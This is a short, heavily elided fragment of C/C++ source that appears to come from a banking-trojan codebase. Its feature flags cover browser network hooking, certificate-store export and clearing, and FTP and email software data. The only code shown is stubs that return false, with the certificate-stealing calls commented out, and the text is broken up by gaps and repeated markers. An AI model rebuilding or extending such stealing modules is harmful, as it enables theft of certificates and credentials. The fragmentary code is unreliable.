...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if(BO_BCSERVER_PLATFORMS > 0)
...
{
  return false;//CertStoreHook::_exportMy();
}
...
{
  return false;//CertStoreHook::_clearMy();
}
...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if(BO_SOFTWARE_FTP > 0)
/*
...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if(BO_SOFTWARE_EMAIL > 0)
/*
